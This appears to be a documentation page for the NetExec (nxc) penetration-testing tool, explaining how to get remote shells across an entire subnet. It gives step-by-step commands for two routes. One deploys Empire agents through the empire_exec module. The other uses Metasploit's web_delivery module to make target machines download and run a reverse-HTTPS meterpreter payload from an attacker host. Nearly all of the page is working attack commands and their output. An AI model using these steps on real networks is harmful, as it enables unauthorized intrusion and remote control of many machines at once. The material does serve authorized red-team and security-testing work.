# Getting Shells 101

## Getting Shells 101

We all love shells and that's why nxc makes it as easy as possible to get them! There really is something magical about shelling a /24

## Empire Agent

{% hint style="info" %}
Use the new Empire in Python3 [https://github.com/BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire)
{% endhint %}

We can use the `empire_exec` module to execute an Empire Agent's initial stager. In the background, the module connects to Empire's RESTful API, generates a launcher for the specified listener and executes it.

* First setup the rest API:

```bash
python powershell-empire --rest --user empireadmin --pass Password123!
[*] Loading modules from: /home/mpgn/Tools/Empire/lib/modules/
 * Starting Empire RESTful API on port: 1337
 * RESTful API token: l5l051eqiqe70c75dis68qjheg7b19di7n8auzml
 * Running on https://0.0.0.0:1337/ (Press CTRL+C to quit)
```

* Second setup a listener:

```bash
(Empire: listeners) > set Name test
(Empire: listeners) > set Host 192.168.10.3
(Empire: listeners) > set Port 9090
(Empire: listeners) > set CertPath data/empire.pem
(Empire: listeners) > run
(Empire: listeners) > list

[*] Active listeners:

  ID    Name              Host                                 Type      Delay/Jitter   KillDate    Redirect Target
  --    ----              ----                                 -------   ------------   --------    ---------------
  1     test              http://192.168.10.3:9090                 native    5/0.0                      

(Empire: listeners) > 
```

The username and password that nxc uses to authenticate to Empire's RESTful API are stored in the nxc.conf file located at \~/.nxc/nxc.conf:

```bash
[Empire]
api_host=127.0.0.1
api_port=1337
username=empireadmin
password=Password123!

[Metasploit]
rpc_host=127.0.0.1
rpc_port=55552
password=abc123
```

* Then just run the `empire_exec` module and specify the listener name:

```bash
nxc 192.168.10.0/24 -u username -p password -M empire_exec -o LISTENER=test
```

## Meterpreter

We can use the `metinject` module launch a meterpreter using [Invoke-MetasploitPayload](https://github.com/jaredhaight/Invoke-MetasploitPayload) `Invoke-MetasploitPayload.ps1` script.

On your Metasploit instance, run the following commands

```bash
use exploit/multi/script/web_delivery
```

The SRVHOST and SRVPORT variables are used for running the webserver to host the script

```bash
set SRVHOST 10.211.55
set SRVPORT 8443
```

The `target` variable determines what type of script we're using. `2` is for PowerShell

```bash
set target 2
```

Pick your payload. In this case, we'll use a reverse https meterpreter payload

```bash
set payload windows/meterpreter/reverse_https
set LHOST 10.211.55
set LPORT 443
```

Run the exploit

```bash
run -j
```

Once run, the web\_delivery module will spin up the webserver to host the script and reverse listener for our meterpreter session.

```bash
msf exploit(web_delivery) > run -j
[*] Exploit running as background job.

[*] Started HTTPS reverse handler on https://10.211.55.4:8443/
[*] Using URL: http://10.211.55.4:8080/eYEssEwv2D
[*] Local IP: http://10.211.55.4:8080/eYEssEwv2D
[*] Server started.
```

* Then just run the `met_inject` module and specify the LHOST and LPORT values:

```bash
nxc 192.168.10.0/24 -u username -p password -M met_inject -o SRVHOST=192.168.10.3 SRVPORT=8443 RAND=eYEssEwv2D SSL=http
```
